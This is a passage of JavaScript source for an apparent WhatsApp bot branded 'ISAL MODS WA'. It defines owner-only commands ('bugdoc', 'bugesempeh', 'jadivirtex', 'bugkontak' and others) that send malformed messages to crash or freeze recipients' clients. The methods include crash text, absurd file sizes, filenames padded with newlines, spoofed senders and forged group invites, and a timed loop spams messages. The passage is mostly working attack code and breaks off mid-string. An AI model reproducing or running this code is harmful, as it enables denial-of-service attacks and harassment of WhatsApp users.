                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: a})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"."}, {quoted: b})
                await sleep(30000)
                ranz.sendMessage(Pe, {text:"© ISAL MODS WA"}, {quoted: b})
                await sleep(30000)
break
//=================================================//
case 'bugpc': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: thumb }, { upload: ranz.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `ISAL INVITE ${buttonvirus}`,
"groupName": `ISAL INVITE ${buttonvirus}`,
"caption": `© ISAL MODS WA`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, groupInvite.message, { messageId: groupInvite.key.id })
}
break
//=================================================//
case 'jadivirtex':
if (!isCreator) return
if (!text) throw `MANA TEXT NYA KONTOL`
ranz.sendMessage(m.chat, { text: `${text} ${virtexcrash}`, contextInfo:{"externalAdReply": {"title": ` ${ranzmods}`,"body": `${virtexcrash}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ``,"sourceUrl": "https://wa.me/stickerpack/StickerHeist"}}}, { quoted: m})
break
//=================================================//
case 'jadivirtex2':
if (!isCreator) return
if (!text) throw `MANA TEXT NYA KONTOL`
ranz.sendMessage(m.chat, { text: `${text} ${virtexcrash}`, contextInfo:{"externalAdReply": {"title": ` ${ranzmods}`,"body": `${ranzmods}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": ``,"sourceUrl": "https://wa.me/stickerpack/StickerHeist"}}}, { quoted: m})
break
//=================================================//
case 'bugmaster': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var extended = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"extendedTextMessage": {
"text": "https://wa.me/c/6285714170944",
"matchedText": "https://wa.me/c/6285714170944",
"description": "Developer ISAL MODS WA\nWhatsApp / Script Bot \n\nORDER ? CHAT AJA 👋",
"title": `© ISAL MODS WA${ngazap(prefix)}`,
"previewType": "NONE",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, extended.message, { messageId: extended.key.id })
}
break
//=================================================//
case 'darkness': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "🔥",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"fileLength": "12300",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `Darkness メ ${virtexcrash}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bugdoc': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "🔥",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"fileLength": "12300",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© ISAL MODS WA 👋 ${virtexcrash}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bugdoc2': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "🔥",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"fileLength": "5000000000000000",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `© ISAL WAS HERE 👋 ${virtexcrash}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bugesempeh': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "🔥",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"fileLength": "1230000000000",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `ESEMPEH BUG 🗿 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bugisal': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "🔥",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"fileLength": "50000000000",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `Isalmods メ ${virtexcrash}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'revengetobastard': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/thumbnail.jpg') }, { upload: ranz.waUploadToServer })
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc",
"mimetype": "🔥",
"title": ".dev",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"fileLength": "32000",
"pageCount": 0,
"mediaKey": "EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=",
"fileName": `Revenge to bastard メ \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n${ngazap(prefix)}`,
"fileEncSha256": "dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=",
"directPath": "/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5",
"mediaKeyTimestamp": "1657288637",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
break
//=================================================//
case 'bugstik': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var sticker = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, sticker.message, { messageId: sticker.key.id })
}
break
//=================================================//
case 'bugkontak': {
if (!isCreator) return
adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `© ISAL MODS WA`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© ISAL MODS WA ${ngazap(prefix)}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© ISAL MODS WA\nitem1.TEL;waid=999999999:+62 857-2450-6534\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64: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\nX-WA-BIZ-DESCRIPTION:© ISAL MODS WA",
}
}), { userJid: m.chat, quoted: adehvn })
ranz.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
}
break
//=================================================//
case 'bugkontak2': {
if (!isCreator) return
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `© ISAL MODS X4 ${virtexcrash}`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:© ISAL MODS WA\nitem1.TEL;waid=999999999:+62 857-2450-6534\nitem1.X-ABLabel:Ponsel\nPHOTO;BASE64:/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAA